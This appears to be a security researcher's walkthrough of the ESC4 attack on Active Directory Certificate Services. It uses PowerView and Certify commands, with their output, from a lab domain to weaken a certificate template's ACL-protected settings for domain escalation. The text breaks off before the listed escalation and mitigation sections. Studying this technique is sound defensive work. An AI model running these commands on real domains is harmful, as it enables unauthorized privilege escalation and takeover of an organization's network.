# Abusing Weak ACL on Certificate Templates

## Table of Contents
+ [Abstract](#abstract)
+ [Vulnerable Template Setting](#vulnerable-template-setting)
+ [Enumerating Certificate Template Objects](#enumerating-certificate-template-objects)
+ [Exploitable Domain Object Attributes for Domain Escalation](#exploitable-domain-object-attributes-for-domain-escalation)
+ [Abusing WriteDacl ACE](#abusing-writedacl-ace)
  + [Procedure](#procedure)
  + [Getting Enrollment Right](#getting-enrollment-right)
  + [Disabling Manager Approval Requirement](#disabling-manager-approval-requirement)
  + [Disabling Authorized Signature Requirement](#disabling-authorized-signature-requirement)
  + [Enabling SAN Specification](#enabling-san-specification)
  + [Editting Certificate Application Policy Extension](#editting-certificate-application-policy-extension)
  + [Domain Escalation](#domain-escalation)
+ [Mitigation](#mitigation)
+ [Conclusion](#conclusion)
+ [Acknowledgments](#acknowledgments)


## Abstract
At Black Hat USA 2021, Will Schroeder ([@harmj0y](https://twitter.com/harmj0y)) and Lee Christensen ([@tifkin_](https://twitter.com/tifkin_)) presented about attack surface in Active Directory Certificate Services (["Certified Pre-Owned: Abusing Active Directory Certificate Services"](https://posts.specterops.io/certified-pre-owned-d95910965cd2)). 
There are many technical details in the [whitepaper](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf). 
The whitepaper mentioned that a certificate template with weak ACL can lead to domain escalation, but there is no technical detail about the procedure.
Therefore, I summarized my investigation about certificate templates with weak ACL in this article.


## Vulnerable Template Setting
As mentioned earlier, a certificate template with weak ACL can lead to domain escalation.
The whitepaper assigned "ESC4" to this attack vector as an identifier. 

To test the domain escalation method, we created a vulnerable certificate template by duplicating "Basic EFS" template (named it as "ESC4"). 
The template settings are as follows:

+ Manager Approval requirement is enable

+ An Authorized Signature is required to issue certificate

+ Subject Name cannot be supplied in request

+ Set "Encrypting File System" for Certificate Application Policy Extension

These settings are intended to prevent domain escalation and lateral movement.
But if low privileged user account has WriteDacl for this template, these restrictions can be broken, and attackers can abuse it for domain escalation.
For example, in this article, __we assign WriteDacl permission to "Domain Users" for the target certificate template__:

![ace](./figures/ace.png)

At the start, no permissions other than WriteDacl have been set for "Domain Users", so certificates cannot be enrolled using the target certificate template by "Domain Users".
In this article, we will examine the Domain Escalation technique using certificate templates, exploiting only WriteDacl permission.


## Enumerating Certificate Template Objects
To enumerate domain objects for certificate template, we can use PowerView or PowerShell native cmdlets.
If you want to enumerate domain objects for certificate templates without PowerView, execute following cmdlets:

```
PS C:\Tools> $ds = New-Object DirectoryServices.DirectorySearcher
PS C:\Tools> $ds.SearchRoot = "LDAP://CN=Configuration,DC=contoso,DC=local"
PS C:\Tools> $ds.Filter = "(objectclass=pkicertificatetemplate)"
PS C:\Tools> $ds.FindAll().Properties

Name                           Value
----                           -----
objectcategory                 {CN=PKI-Certificate-Template,CN=Schema,CN=Configuration,DC=contoso,DC=local}
pkidefaultcsps                 {2,Microsoft Base Cryptographic Provider v1.0, 1,Microsoft Enhanced Cryptographic Pro...
pkidefaultkeyspec              {1}
pkimaxissuingdepth             {0}
usnchanged                     {12930}
instancetype                   {4}
flags                          {66106}
pkikeyusage                    {160 0}
name                           {User}
pkicriticalextensions          {2.5.29.15}
showinadvancedviewonly         {True}
objectclass                    {top, pKICertificateTemplate}
pkiextendedkeyusage            {1.3.6.1.4.1.311.10.3.4, 1.3.6.1.5.5.7.3.4, 1.3.6.1.5.5.7.3.2}
pkioverlapperiod               {0 128 166 10 255 222 255 255}
usncreated                     {12930}
dscorepropagationdata          {1/1/1601 12:00:00 AM}
mspki-template-minor-revision  {1}
whencreated                    {9/12/2021 11:32:35 AM}
adspath                        {LDAP://CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Config...
mspki-cert-template-oid        {1.3.6.1.4.1.311.21.8.15030743.11787675.8208785.16745297.429065.235.1.1}
cn                             {User}
mspki-enrollment-flag          {41}
whenchanged                    {9/12/2021 11:32:35 AM}
mspki-template-schema-version  {1}
mspki-certificate-name-flag    {-1509949440}
mspki-minimal-key-size         {2048}
distinguishedname              {CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration...
pkiexpirationperiod            {0 64 57 135 46 225 254 255}
mspki-ra-signature             {0}
mspki-private-key-flag         {16}
displayname                    {User}
objectguid                     {150 169 93 171 72 38 114 76 163 123 198 245 240 170 84 45}
revision                       {3}

--snip--
```

If you use PowerView, execute `Get-DomainObject` function:

```
PS C:\Tools> Get-DomainObject -SearchBase "CN=Configuration,DC=contoso,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)"


mspki-enrollment-flag         : 41
mspki-certificate-name-flag   : -1509949440
pkidefaultcsps                : {2,Microsoft Base Cryptographic Provider v1.0, 1,Microsoft Enhanced Cryptographic
                                Provider v1.0}
distinguishedname             : CN=User,CN=Certificate Templates,CN=Public Key
                                Services,CN=Services,CN=Configuration,DC=contoso,DC=local
pkidefaultkeyspec             : 1
objectclass                   : {top, pKICertificateTemplate}
displayname                   : User
name                          : User
pkiextendedkeyusage           : {1.3.6.1.4.1.311.10.3.4, 1.3.6.1.5.5.7.3.4, 1.3.6.1.5.5.7.3.2}
showinadvancedviewonly        : True
cn                            : User
flags                         : 66106
whenchanged                   : 9/12/2021 11:32:35 AM
instancetype                  : 4
usncreated                    : 12930
objectguid                    : ab5da996-2648-4c72-a37b-c6f5f0aa542d
mspki-ra-signature            : 0
mspki-cert-template-oid       : 1.3.6.1.4.1.311.21.8.15030743.11787675.8208785.16745297.429065.235.1.1
pkimaxissuingdepth            : 0
objectcategory                : CN=PKI-Certificate-Template,CN=Schema,CN=Configuration,DC=contoso,DC=local
dscorepropagationdata         : 1/1/1601 12:00:00 AM
mspki-minimal-key-size        : 2048
mspki-private-key-flag        : 16
pkikeyusage                   : {160, 0}
revision                      : 3
pkiexpirationperiod           : {0, 64, 57, 135...}
usnchanged                    : 12930
whencreated                   : 9/12/2021 11:32:35 AM
mspki-template-schema-version : 1
pkioverlapperiod              : {0, 128, 166, 10...}
mspki-template-minor-revision : 1
pkicriticalextensions         : 2.5.29.15

--snip--
```

Additionally, `Get-DomainObjectAcl` function can be used to find vulnerable certificate templates with weak ACL as follows:

```
PS C:\Tools> Get-DomainObjectAcl -SearchBase "CN=Configuration,DC=contoso,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -ResolveGUIDs | %{ $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ } |  ?{ $_.Identity -match "Domain Users" }

--snip--

AceType               : AccessAllowed
ObjectDN              : CN=ESC4,CN=Certificate Templates,CN=Public Key
                        Services,CN=Services,CN=Configuration,DC=contoso,DC=local
ActiveDirectoryRights : WriteProperty, WriteDacl, WriteOwner
OpaqueLength          : 0
ObjectSID             :
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3654360273-254804765-2004310818-513
AccessMask            : 786464
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
Identity              : CONTOSO\Domain Users

--snip--
```

We can confirm "Domain Users" group members have WriteDacl for ESC4 template.

This result can also be obtained using [`Certify.exe`](https://github.com/GhostPack/Certify) from GhostPack:

```
C:\Tools>Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=contoso,DC=local'

[*] Listing info about the Enterprise CA 'contoso-CA01-CA'

    Enterprise CA Name            : contoso-CA01-CA
    DNS Hostname                  : CA01.contoso.local
    FullName                      : CA01.contoso.local\contoso-CA01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=contoso-CA01-CA, DC=contoso, DC=local
    Cert Thumbprint               : A6A520632FBFE64686B184E62D56E9E27A3CA5AA
    Cert Serial                   : 38706A5FBAA1B2B442FFD08A6E2341E3
    Cert Start Date               : 9/12/2021 4:22:34 AM
    Cert End Date                 : 9/12/2026 4:32:34 AM
    Cert Chain                    : CN=contoso-CA01-CA,DC=contoso,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
      Allow  ManageCA, ManageCertificates               CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                         : CA01.contoso.local\contoso-CA01-CA
    Template Name                   : ESC4
    Schema Version                  : 2
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PEND_ALL_REQUESTS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 1
    Application Policies            : Encrypting File System
    pkiextendedkeyusage             : Encrypting File System
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
                                      CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519
      Object Control Permissions
        Owner                       : CONTOSO\Administrator         S-1-5-21-3654360273-254804765-2004310818-500
        WriteOwner Principals       : CONTOSO\Administrator         S-1-5-21-3654360273-254804765-2004310818-500
                                      CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
                                      CONTOSO\Domain Users          S-1-5-21-3654360273-254804765-2004310818-513
                                      CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519
        WriteDacl Principals        : CONTOSO\Administrator         S-1-5-21-3654360273-254804765-2004310818-500
                                      CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
                                      CONTOSO\Domain Users          S-1-5-21-3654360273-254804765-2004310818-513
                                      CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519
        WriteProperty Principals    : CONTOSO\Administrator         S-1-5-21-3654360273-254804765-2004310818-500
                                      CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
                                      CONTOSO\Domain Users          S-1-5-21-3654360273-254804765-2004310818-513
                                      CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519



Certify completed in 00:00:00.3047464

C:\Tools>
```


## Exploitable Domain Object Attributes for Domain Escalation
Using PowerView, we can enumerate vulnerable template object attributes as follows:

```
PS C:\Tools> Get-DomainObject -SearchBase "CN=Configuration,DC=contoso,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -Identity ESC4


mspki-enrollment-flag                : 43
mspki-certificate-name-flag          : -2113929216
pkidefaultcsps                       : 1,Microsoft Enhanced Cryptographic Provider v1.0
distinguishedname                    : CN=ESC4,CN=Certificate Templates,CN=Public Key
                                       Services,CN=Services,CN=Configuration,DC=contoso,DC=local
pkidefaultkeyspec                    : 1
objectclass                          : {top, pKICertificateTemplate}
displayname                          : ESC4
name                                 : ESC4
mspki-certificate-application-policy : 1.3.6.1.4.1.311.10.3.4
pkiextendedkeyusage                  : 1.3.6.1.4.1.311.10.3.4
showinadvancedviewonly               : True
cn                                   : ESC4
flags                                : 131640
whenchanged                          : 10/1/2021 4:58:55 AM
instancetype                         : 4
usncreated                           : 49238
objectguid                           : 88ea6142-28af-4b2d-99a8-bd9d10bc53ba
mspki-ra-signature                   : 1
mspki-cert-template-oid              : 1.3.6.1.4.1.311.21.8.15030743.11787675.8208785.16745297.429065.235.12902112.1610
                                       0058
pkimaxissuingdepth                   : 0
objectcategory                       : CN=PKI-Certificate-Template,CN=Schema,CN=Configuration,DC=contoso,DC=local
dscorepropagationdata                : {10/1/2021 4:58:41 AM, 1/1/1601 12:00:00 AM}
mspki-minimal-key-size               : 2048
mspki-private-key-flag               : 16842768
pkikeyusage                          : {32, 0}
revision                             : 100
pkiexpirationperiod                  : {0, 64, 57, 135...}
usnchanged                           : 49242
whencreated                          : 10/1/2021 4:57:23 AM
mspki-template-schema-version        : 2
pkioverlapperiod                     : {0, 128, 166, 10...}
mspki-template-minor-revision        : 4
pkicriticalextensions                : 2.5.29.15
mspki-ra-application-policies        : 1.3.6.1.4.1.311.10.3.4



PS C:\Tools>
```

There are a lot of attributes, but not many of them are important for domain escalation. The important attributes are following:

+ __`mspki-enrollment-flag`__: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1), this attribute specifies the enrollment flags. If we succeeded in disabling `PEND_ALL_REQUESTS` flag, we can request the template without Manager Approval. In GUI, this attribute can be enabled by checking "CA manager approval" check box in "Issuance Requirements" tab.

+ __`mspki-ra-signature`__: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/160d0057-bfa9-46c5-a839-72e7588f0420), this attribute specifies the number of Authorized Signatures to issue certificate. In GUI, this attribute can be controlled by checking "This number of authorized signatures" check box in "Issuance Requirements" tab and setting the number.

+ __`mspki-certificate-name-flag`__: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1), this attribute specifies the subject name flags. If we succeeded in enabling `ENROLLEE_SUPPLIES_SUBJECT` flag, we can specify an arbitrary user account Subject Alternative Name (SAN) in certificate request and get high domain privileges. In GUI, this attribute can be enabled by choosing "Supplly in the request" in "Subject Name" tab.

+ __`mspki-certificate-application-policy`__: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/44012f2d-5ef3-440d-a61b-b30d3d978130), this attribute specifies Certificate Application Policy Extension. In GUI, this attribute can be controlled by setting "Application Policies" in "Extensions" tab.

+ __`pkiextendedkeyusage`__: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/be8af2e6-01d8-49a5-bacf-be641041ac73), this attribute specifies Extended Key Usage (EKU).

+ __`mspki-ra-application-policies`__: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/3fe798de-6252-4350-aace-f418603ddeda), this attribute encapsulates embedded properties for multipurpose use. In GUI, this attribute can be controlled by checking "This number of authorized signatures" check box in "Issuance Requirements" tab and choosing "Application Policy" menu. `Certify.exe` displays this attribute as `Application Policies`.

The following figures show the relationship between attributes and menus:

![attributes-1](./figures/attributes1.png)

![attributes-2](./figures/attributes2.png)

![attributes-3](./figures/attributes3.png)



## Abusing WriteDacl ACE

### Procedure
For domain escalation, follow the following steps to abuse WriteDacl:

1. Get Enrollment rights for the vulnerable template (ESC4)

2. Disable `PEND_ALL_REQUESTS` flag in `mspki-enrollment-flag` for disabling Manager Approval

3. Set `mspki-ra-signature` attribute to `0` for disabling Authorized Signature requirement

4. Enable `ENROLLEE_SUPPLIES_SUBJECT` flag in `mspki-certificate-name-flag` for specifying high privileged account name as a SAN

5. Set `mspki-certificate-application-policy` to a certificate purpose for authentication

6. Request a high privileged certificate for authentication and perform Pass-The-Ticket attack

Shouldn't we edit `pkiextendedkeyusage` attribute and `mspki-ra-application-policies` attribute?
As far as I tested, it is not required.
This is because if the `mspki-certificate-application-policy`, `pkiextendedkeyusage` and `mspki-ra-application-policies` do not match, then `mspki-certificate-application-policy` takes precedence in the use of the certificate.　
Therefore, for Domain Escalation, you only need to edit `mspki-certificate-application-policy` to abuse vulnerable certificate in this case.

### Getting Enrollment Right
Now we only have WriteDacl for ESC4 template and cannot enroll the template.
Generally, certificate templates have 2 extended rights:

+ __`Certificate-Enrollment`__: This extended right corresponds "Enroll" right. According to the [Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/adschema/r-certificate-enrollment), the corresponding GUID is `0e10c968-78fb-11d2-90d4-00c04f79dc55`.

+ __`Certificate-AutoEnrollment`__: This extended right corresponds "Autoenroll" right. According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/ece0ab37-35bf-41d0-a30b-64f9a5792f59), the corresponding GUID is `a05b8cc2-17bc-4802-a710-e7c15ab866a2`.

To get enrollment right for the template, we need to add `Certificate-Enrollment` (GUID: `0e10c968-78fb-11d2-90d4-00c04f79dc55`) extended right to the target certificate.

> __NOTE__: If you want to add all extended rights (in this case, `Certificate-Enrollment` and `Certificate-AutoEnrollment`) at once, use `00000000-0000-0000-0000-000000000000` as GUID. It corresponds to all extended rights.

We can get `Certificate-Enrollment` extended right for the vulnerable template (ESC4) by `Add-DomainObjectAcl` function of PowerView as follows:

```
PS C:\Tools> Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=contoso,DC=local" -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.CONTOSO.LOCAL/DC=CONTOSO,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=Domain Users)(name=Domain
Users)(displayname=Domain Users))))
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.CONTOSO.LOCAL/CN=Configuration,DC=contoso,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ESC4)(name=ESC4)(displayname=ESC4))))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Domain Users,CN=Users,DC=contoso,DC=local 'All' on
CN=16436712.C9FC364DA743F327A81BD9832F3BBFD3,CN=OID,CN=Public Key
Services,CN=Services,CN=Configuration,DC=contoso,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Domain Users,CN=Users,DC=contoso,DC=local rights GUID
'0e10c968-78fb-11d2-90d4-00c04f79dc55' on CN=16436712.C9FC364DA743F327A81BD9832F3BBFD3,CN=OID,CN=Public Key
Services,CN=Services,CN=Configuration,DC=contoso,DC=local
VERBOSE: [Add-DomainObjectAcl] Error granting principal CN=Domain Users,CN=Users,DC=contoso,DC=local 'All' on
CN=16436712.C9FC364DA743F327A81BD9832F3BBFD3,CN=OID,CN=Public Key
Services,CN=Services,CN=Configuration,DC=contoso,DC=local : Exception calling "CommitChanges" with "0" argument(s):
"Access is denied.
"
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Domain Users,CN=Users,DC=contoso,DC=local 'All' on
CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Domain Users,CN=Users,DC=contoso,DC=local rights GUID
'0e10c968-78fb-11d2-90d4-00c04f79dc55' on CN=ESC4,CN=Certificate Templates,CN=Public Key
Services,CN=Services,CN=Configuration,DC=contoso,DC=local
PS C:\Tools>
```

The results can be verified using `Certify.exe`, etc.:

```
C:\Tools>Certify.exe find /vulnerable

--snip--

[!] Vulnerable Certificates Templates :

    CA Name                         : CA01.contoso.local\contoso-CA01-CA
    Template Name                   : ESC4
    Schema Version                  : 2
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PEND_ALL_REQUESTS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 1
    Application Policies            : Encrypting File System
    pkiextendedkeyusage             : Encrypting File System
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
                                      CONTOSO\Domain Users          S-1-5-21-3654360273-254804765-2004310818-513
                                      CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519

--snip--
```

Now we got enrollment rights for the vulnerable certificate.

### Disabling Manager Approval Requirement
There is one more obstacle to issuing the certificate.
To get a certificate with the target template passively, we need to disable Manager Approval requirement.

To disable Manager Approval requirement, we need to set `PEND_ALL_REQUESTS` flag bit in `mspki-enrollment-flag` attribute to null.
According to [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1), the `PEND_ALL_REQUESTS` flag bit is `0x00000002`. 
Abusing WriteDacl, we can set `PEND_ALL_REQUESTS` flag bit to null by `Set-DomainObject` function of PowerView:

```
PS C:\Tools> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity ESC4 -XOR @{'mspki-enrollment-flag'=2} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.CONTOSO.LOCAL/CN=Certificate Templates,CN=Public Key
Services,CN=Services,CN=Configuration,DC=contoso,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ESC4)(name=ESC4)(displayname=ESC4))))
VERBOSE: [Set-DomainObject] XORing 'mspki-enrollment-flag' with '2' for object ''
PS C:\Tools>
```

To avoid complications, it is preferable to use the `-XOR` option instead of the `-Set` option to edit the flag as above.
We can recover the setting by executing the same command.

The results can be verified using `Certify.exe`, etc.:

```
C:\Tools>Certify.exe find /vulnerable

--snip--

[!] Vulnerable Certificates Templates :

    CA Name                         : CA01.contoso.local\contoso-CA01-CA
    Template Name                   : ESC4
    Schema Version                  : 2
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 1
    Application Policies            : Encrypting File System
    pkiextendedkeyusage             : Encrypting File System
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
                                      CONTOSO\Domain Users          S-1-5-21-3654360273-254804765-2004310818-513
                                      CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519

--snip--
```

There is no `PEND_ALL_REQUESTS` in `mspki-enrollment-flag`.
Now we can issue certificates using the ESC4 template without Manager Approval.

### Disabling Authorized Signature Requirement
Authorized Signature requirement blocks unauthorized certificate issuance.
So, to issue certificates with vulnerable certificate templates, we need to bypass this requirement.
If we have WriteDacl for target certificate template, we can disable this requirement by setting the number of Authorized Signatures to `0`.

The number of Authorized Signatures for certificate templates is specified with `mspki-ra-signature`.
Abusing WriteDacl, we can set `mspki-ra-signature` attribute to `0` by `Set-DomainObject` function of PowerView: 

```
PS C:\Tools> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity ESC4 -Set @{'mspki-ra-signature'=0} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.CONTOSO.LOCAL/CN=Certificate Templates,CN=Public Key
Services,CN=Services,CN=Configuration,DC=contoso,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ESC4)(name=ESC4)(displayname=ESC4))))
VERBOSE: [Set-DomainObject] Setting 'mspki-ra-signature' to '0' for object ''
PS C:\Tools>
```

The results can be verified using `Certify.exe`, etc.:

```
C:\Tools>Certify.exe find /vulnerable

--snip--

[!] Vulnerable Certificates Templates :

    CA Name                         : CA01.contoso.local\contoso-CA01-CA
    Template Name                   : ESC4
    Schema Version                  : 2
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    Application Policies            : Encrypting File System
    pkiextendedkeyusage             : Encrypting File System
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
                                      CONTOSO\Domain Users          S-1-5-21-3654360273-254804765-2004310818-513
                                      CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519

--snip--
```

`Authorized Signatures Required` is `0`.
Now we can issue certificate with the ESC4 template without any Authorized Signatures.


### Enabling SAN Specification
Similar to the Manager Approval requirement, SAN setting can be controlled by flag bits in `mspki-certificate-name-flag` attribute.
According to [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1), the `ENROLLEE_SUPPLIES_SUBJECT` flag bit is `0x00000001`. 
So, abusing WriteDacl, we can set the `ENROLLEE_SUPPLIES_SUBJECT` flag bit by `Set-DomainObject` function of PowerView:

```
PS C:\Tools> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity ESC4 -XOR @{'mspki-certificate-name-flag'=1} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.CONTOSO.LOCAL/CN=Certificate Templates,CN=Public Key
Services,CN=Services,CN=Configuration,DC=contoso,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ESC4)(name=ESC4)(displayname=ESC4))))
VERBOSE: [Set-DomainObject] XORing 'mspki-certificate-name-flag' with '1' for object ''
PS C:\Tools>
```

To avoid complications, it is preferable to use the `-XOR` option instead of the `-Set` option to edit the flag as above.
We can recover the setting by executing the same command.

The results can be verified using `Certify.exe`, etc.:

```
C:\Tools>Certify.exe find /vulnerable

--snip--

[!] Vulnerable Certificates Templates :

    CA Name                         : CA01.contoso.local\contoso-CA01-CA
    Template Name                   : ESC4
    Schema Version                  : 2
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT, SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    Application Policies            : Encrypting File System
    pkiextendedkeyusage             : Encrypting File System
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
                                      CONTOSO\Domain Users          S-1-5-21-3654360273-254804765-2004310818-513
                                      CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519

--snip--
```

`ENROLLEE_SUPPLIES_SUBJECT` appears in `msPKI-Certificates-Name-Flag`, so now we can specify any user name as SAN in the ESC4 template.


#### Editting Certificate Application Policy Extension
The final step of setting the vulnerable template for domain escalation is to change the Certificate Application Policy Extension.
As mentioned earlier, Certificate Application Policy Extension are specified with `mspki-certificate-application-policy` attribute.
For authentication, following Key Usage can be used:

+ Client Authentication (OID: `1.3.6.1.5.5.7.3.2`)

+ Smart Card Logon (OID: `1.3.6.1.4.1.311.20.2.2`)

+ PKINIT Client Authentication (OID: `1.3.6.1.5.2.3.4`)

+ Any Purpose (OID: `2.5.29.37.0`)

+ No EKU

> __NOTE__: If CA servers don't enable PKINIT Client Authentication, we can not use PKINIT Client Authentication in this step.

In this article, we set Certificate Application Policy Extension to "Client Authentication".
Abusing WriteDacl, we can achieve this by `Set-DomainObject` function of PowerView as follows:

```
PS C:\Tools> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity ESC4 -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.CONTOSO.LOCAL/CN=Certificate Templates,CN=Public Key
Services,CN=Services,CN=Configuration,DC=contoso,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ESC4)(name=ESC4)(displayname=ESC4))))
VERBOSE: [Set-DomainObject] Setting 'mspki-certificate-application-policy' to '1.3.6.1.5.5.7.3.2' for object ''
PS C:\Tools>
```

The output of `Certify.exe` is following:

```
C:\Tools>Certify.exe find /vulnerable

--snip--

[!] Vulnerable Certificates Templates :

    CA Name                         : CA01.contoso.local\contoso-CA01-CA
    Template Name                   : ESC4
    Schema Version                  : 2
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT, SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    Application Policies            : Encrypting File System
    pkiextendedkeyusage             : Encrypting File System
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
                                      CONTOSO\Domain Users          S-1-5-21-3654360273-254804765-2004310818-513
